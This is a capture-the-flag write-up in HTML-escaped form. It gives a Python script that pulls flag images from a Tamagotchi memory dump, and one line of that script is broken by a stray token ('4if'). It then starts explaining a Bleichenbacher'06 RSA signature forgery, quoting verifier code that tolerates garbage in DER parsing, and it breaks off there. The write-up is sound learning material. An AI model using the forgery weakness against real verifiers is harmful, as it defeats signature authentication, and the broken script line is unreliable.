&lt;p&gt;We have some random &lt;code&gt;.bin&lt;&#x2F;code&gt; file. Hints at a 90s toy, in the videos, Natalie Silvanovich talks about hacking tamagotchi. From Natalie&#x27;s repository &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;natashenka&#x2F;Tamagotchi-Hack&quot;&gt;natashenka&#x2F;Tamagotchi-Hack&lt;&#x2F;a&gt; we can obtain a python script that can extract images from the file that was given to us, a memory dump. &lt;&#x2F;p&gt;
&lt;p&gt;I needed to apply a small change to the script to get the full flag. The solve script is as follows:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;PIL &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Image
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;f &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;challenge.bin&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;rb&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;#offset = 0x201292
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;#offset = 0x257010
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;#offset = 0x2AB139
&lt;&#x2F;span&gt;&lt;span&gt;offset &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;a[offset:]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;o &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;# 0 0xaab# 0 # 0x1539
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;	width &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(a[o])
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;#&#x2F;&#x2F;while (width == 0):
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;#&#x2F;&#x2F;	o = o + 1
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;#&#x2F;&#x2F;	width = ord(a[o])
&lt;&#x2F;span&gt;&lt;span&gt;	height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(a[o&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;width,
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;height
&lt;&#x2F;span&gt;&lt;span&gt;	o &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;o &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;2
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;( height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0x60&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;end&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;o &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;offset
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;	extra &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;( height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0x60&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;end&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;o &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;offset
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;((width) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;((width) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;			width &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;width &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;((height) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt; 4if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;#for t in range(0, (height) % 4):
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;#height  = height + 1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;Padded to &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(width) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot; by &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(height)
&lt;&#x2F;span&gt;&lt;span&gt;	s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, height&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;width&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;#print ord(a[i])
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;#print (0x03 &amp;lt;&amp;lt; ((3- j)*2))
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(a), i, o, i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;o
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;o &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(a): &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;			k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(a[i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;o]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;amp; &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0x03 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;j)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;			l &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;((k) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;j)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;		
&lt;&#x2F;span&gt;&lt;span&gt;			s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0xFF&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span&gt;(l&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;255&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;))))
&lt;&#x2F;span&gt;&lt;span&gt;	o &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;o &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;height&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;width&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;4
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;#print s
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;# fromstring
&lt;&#x2F;span&gt;&lt;span&gt;	image &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;Image.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;frombytes&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;L&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, (width, height), s, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;raw&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;L&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        )
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;img &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(num) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot; at &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(o)
&lt;&#x2F;span&gt;&lt;span&gt;	image.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;save&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;&#x2F;data&#x2F;im-&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(num) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;.bmp&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;With this, we get images that spell out the flag.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep005ch02&quot;&gt;EP005CH02&lt;&#x2F;h2&gt;
&lt;p&gt;I wish I had the time to prepare a proper writeup for this attack, it was a lot of fun. 
This was a really fun challenge, a tricky case of Bleichenbacher&#x27;06. Unfortunately I am really pressed for time right now, but the following two links should give a good introduction to the BB&#x27;06 attack.&lt;&#x2F;p&gt;
&lt;p&gt;This writeup is heavily adapted from &lt;a href=&quot;https:&#x2F;&#x2F;words.filippo.io&#x2F;bleichenbacher-06-signature-forgery-in-python-rsa&#x2F;&quot;&gt;Filippo Valsorda&#x27;s writeup&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Here&#x27;s another useful &lt;a href=&quot;https:&#x2F;&#x2F;mailarchive.ietf.org&#x2F;arch&#x2F;msg&#x2F;openpgp&#x2F;5rnE9ZRN1AokBVj3VqblGlP63QE&#x2F;&quot;&gt;post&lt;&#x2F;a&gt; on the topic, by Hal Finney.&lt;&#x2F;p&gt;
&lt;p&gt;Here&#x27;s a useful video on the topic, from BlackHat: &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=2xspZfXI_nY&quot;&gt;A Decade After Bleichenbacher &#x27;06, RSA Signature Forgery Still Works&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The tricky bit in this challenge is finding where we can put garbage. &lt;&#x2F;p&gt;
&lt;p&gt;The padding is correctly validated, the application ensures the padding is FF bytes.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;padding, digest_info &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;k[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;:].&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(padding) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;raise &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;Exception&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;invalid padding length&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;padding &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xff&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(padding):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;raise &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;Exception&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;invalid padding content&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;However, in the DER sequence parsing part, we can fit garbage:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;sequence &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;DerSequence&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;sequence.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;(digest_info)
&lt;&#x2F;span&gt;&lt;span&gt;_digest_algorithm_identifier, _digest &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;sequence
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;sequence &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;DerSequence&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;sequence.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;(_digest_algorithm_identifier)
&lt;&#x2F;span&gt;&lt;span&gt;_digest_algorithm_identifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;sequence[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;
